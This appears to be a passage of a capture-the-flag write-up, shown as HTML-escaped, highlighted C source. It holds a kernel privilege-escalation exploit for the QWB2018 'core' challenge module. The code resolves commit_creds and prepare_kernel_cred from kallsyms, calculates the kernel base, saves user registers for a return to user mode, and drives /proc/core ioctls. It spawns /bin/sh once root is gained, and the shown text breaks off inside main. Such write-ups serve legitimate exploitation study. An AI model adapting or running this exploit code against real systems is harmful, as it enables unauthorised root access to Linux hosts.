+&lt;span class=&#34;kt&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;spawn_shell&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+	&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;getuid&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;())&lt;/span&gt;
+	&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+		&lt;span class=&#34;n&#34;&gt;system&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;/bin/sh&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+	&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+	&lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;
+	&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+		&lt;span class=&#34;n&#34;&gt;puts&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;[*]spawn shell error!&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+	&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+	&lt;span class=&#34;n&#34;&gt;exit&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+
+&lt;span class=&#34;n&#34;&gt;size_t&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;commit_creds&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;prepare_kernel_cred&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;span class=&#34;n&#34;&gt;size_t&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;raw_vmlinux_base&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0xffffffff81000000&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;span class=&#34;cm&#34;&gt;/* 
+&lt;/span&gt;&lt;span class=&#34;cm&#34;&gt; * give_to_player [master●●] check ./core.ko
+&lt;/span&gt;&lt;span class=&#34;cm&#34;&gt;   ./core.ko: ELF 64-bit LSB relocatable, x86-64, version 1 (SYSV), BuildID[sha1]=549436d
+&lt;/span&gt;&lt;span class=&#34;cm&#34;&gt;   [*] &amp;#39;/home/m4x/pwn_repo/QWB2018_core/give_to_player/core.ko&amp;#39;
+&lt;/span&gt;&lt;span class=&#34;cm&#34;&gt;       Arch:     amd64-64-little
+&lt;/span&gt;&lt;span class=&#34;cm&#34;&gt;       RELRO:    No RELRO
+&lt;/span&gt;&lt;span class=&#34;cm&#34;&gt;       Stack:    Canary found
+&lt;/span&gt;&lt;span class=&#34;cm&#34;&gt;       NX:       NX enabled
+&lt;/span&gt;&lt;span class=&#34;cm&#34;&gt;       PIE:      No PIE (0x0)
+&lt;/span&gt;&lt;span class=&#34;cm&#34;&gt;*/&lt;/span&gt;
+&lt;span class=&#34;n&#34;&gt;size_t&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;vmlinux_base&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;span class=&#34;n&#34;&gt;size_t&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;find_symbols&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+	&lt;span class=&#34;n&#34;&gt;FILE&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;kallsyms_fd&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;fopen&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;/tmp/kallsyms&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;r&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+	&lt;span class=&#34;cm&#34;&gt;/* FILE* kallsyms_fd = fopen(&amp;#34;./test_kallsyms&amp;#34;, &amp;#34;r&amp;#34;); */&lt;/span&gt;
+
+	&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;kallsyms_fd&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+	&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+		&lt;span class=&#34;n&#34;&gt;puts&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;[*]open kallsyms error!&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+		&lt;span class=&#34;n&#34;&gt;exit&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+	&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+
+	&lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;buf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x30&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;};&lt;/span&gt;
+	&lt;span class=&#34;k&#34;&gt;while&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;fgets&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;buf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x30&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;kallsyms_fd&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
+	&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+		&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;commit_creds&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;prepare_kernel_cred&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+			&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+
+		&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;strstr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;buf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;commit_creds&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;commit_creds&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+		&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+			&lt;span class=&#34;cm&#34;&gt;/* puts(buf); */&lt;/span&gt;
+			&lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;hex&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;20&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;};&lt;/span&gt;
+			&lt;span class=&#34;n&#34;&gt;strncpy&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;hex&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;buf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;16&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+			&lt;span class=&#34;cm&#34;&gt;/* printf(&amp;#34;hex: %s\n&amp;#34;, hex); */&lt;/span&gt;
+			&lt;span class=&#34;n&#34;&gt;sscanf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;hex&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;%llx&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;commit_creds&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+			&lt;span class=&#34;n&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;commit_creds addr: %p&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;commit_creds&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+			&lt;span class=&#34;cm&#34;&gt;/*
+&lt;/span&gt;&lt;span class=&#34;cm&#34;&gt;			 * give_to_player [master●●] bpython
+&lt;/span&gt;&lt;span class=&#34;cm&#34;&gt;				bpython version 0.17.1 on top of Python 2.7.15 /usr/bin/n
+&lt;/span&gt;&lt;span class=&#34;cm&#34;&gt;				&amp;gt;&amp;gt;&amp;gt; from pwn import *
+&lt;/span&gt;&lt;span class=&#34;cm&#34;&gt;				&amp;gt;&amp;gt;&amp;gt; vmlinux = ELF(&amp;#34;./vmlinux&amp;#34;)
+&lt;/span&gt;&lt;span class=&#34;cm&#34;&gt;				[*] &amp;#39;/home/m4x/pwn_repo/QWB2018_core/give_to_player/vmli&amp;#39;
+&lt;/span&gt;&lt;span class=&#34;cm&#34;&gt;				    Arch:     amd64-64-little
+&lt;/span&gt;&lt;span class=&#34;cm&#34;&gt;				    RELRO:    No RELRO
+&lt;/span&gt;&lt;span class=&#34;cm&#34;&gt;				    Stack:    Canary found
+&lt;/span&gt;&lt;span class=&#34;cm&#34;&gt;				    NX:       NX disabled
+&lt;/span&gt;&lt;span class=&#34;cm&#34;&gt;				    PIE:      No PIE (0xffffffff81000000)
+&lt;/span&gt;&lt;span class=&#34;cm&#34;&gt;				    RWX:      Has RWX segments
+&lt;/span&gt;&lt;span class=&#34;cm&#34;&gt;				&amp;gt;&amp;gt;&amp;gt; hex(vmlinux.sym[&amp;#39;commit_creds&amp;#39;] - 0xffffffff81000000)
+&lt;/span&gt;&lt;span class=&#34;cm&#34;&gt;				&amp;#39;0x9c8e0&amp;#39;
+&lt;/span&gt;&lt;span class=&#34;cm&#34;&gt;			*/&lt;/span&gt;
+			&lt;span class=&#34;n&#34;&gt;vmlinux_base&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;commit_creds&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x9c8e0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+			&lt;span class=&#34;n&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;vmlinux_base addr: %p&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;vmlinux_base&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+		&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+
+		&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;strstr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;buf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;prepare_kernel_cred&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;prepare_kernel_cred&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+		&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+			&lt;span class=&#34;cm&#34;&gt;/* puts(buf); */&lt;/span&gt;
+			&lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;hex&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;20&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;};&lt;/span&gt;
+			&lt;span class=&#34;n&#34;&gt;strncpy&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;hex&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;buf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;16&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+			&lt;span class=&#34;n&#34;&gt;sscanf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;hex&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;%llx&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;prepare_kernel_cred&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+			&lt;span class=&#34;n&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;prepare_kernel_cred addr: %p&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;prepare_kernel_cred&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+			&lt;span class=&#34;n&#34;&gt;vmlinux_base&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;prepare_kernel_cred&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x9cce0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+			&lt;span class=&#34;cm&#34;&gt;/* printf(&amp;#34;vmlinux_base addr: %p\n&amp;#34;, vmlinux_base); */&lt;/span&gt;
+		&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+	&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+
+	&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;prepare_kernel_cred&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;commit_creds&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
+	&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+		&lt;span class=&#34;n&#34;&gt;puts&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;[*]Error!&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+		&lt;span class=&#34;n&#34;&gt;exit&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+	&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+
+&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+
+&lt;span class=&#34;n&#34;&gt;size_t&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;user_cs&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;user_ss&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;user_rflags&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;user_sp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;span class=&#34;kt&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;save_status&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+	&lt;span class=&#34;n&#34;&gt;__asm__&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;mov user_cs, cs;&amp;#34;&lt;/span&gt;
+			&lt;span class=&#34;s&#34;&gt;&amp;#34;mov user_ss, ss;&amp;#34;&lt;/span&gt;
+			&lt;span class=&#34;s&#34;&gt;&amp;#34;mov user_sp, rsp;&amp;#34;&lt;/span&gt;
+			&lt;span class=&#34;s&#34;&gt;&amp;#34;pushf;&amp;#34;&lt;/span&gt;
+			&lt;span class=&#34;s&#34;&gt;&amp;#34;pop user_rflags;&amp;#34;&lt;/span&gt;
+			&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+	&lt;span class=&#34;n&#34;&gt;puts&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;[*]status has been saved.&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+
+&lt;span class=&#34;kt&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;set_off&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;fd&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;long&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;long&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;idx&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+	&lt;span class=&#34;n&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;[*]set off to %ld&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;idx&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+	&lt;span class=&#34;n&#34;&gt;ioctl&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;fd&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x6677889C&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;idx&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+
+&lt;span class=&#34;kt&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;core_read&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;fd&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;buf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+	&lt;span class=&#34;n&#34;&gt;puts&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;[*]read to buf.&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+	&lt;span class=&#34;n&#34;&gt;ioctl&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;fd&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x6677889B&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;buf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+
+&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+
+&lt;span class=&#34;kt&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;core_copy_func&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;fd&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;long&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;long&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;size&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+	&lt;span class=&#34;n&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;[*]copy from user with size: %ld&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;size&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+	&lt;span class=&#34;n&#34;&gt;ioctl&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;fd&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x6677889A&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;size&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+
+&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+	&lt;span class=&#34;n&#34;&gt;save_status&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
+	&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;fd&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;open&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;/proc/core&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+	&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;fd&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+	&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+		&lt;span class=&#34;n&#34;&gt;puts&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;[*]open /proc/core error!&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+		&lt;span class=&#34;n&#34;&gt;exit&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+	&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+	
+	&lt;span class=&#34;n&#34;&gt;find_symbols&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
+	&lt;span class=&#34;c1&#34;&gt;// gadget = raw_gadget - raw_vmlinux_base + vmlinux_base;
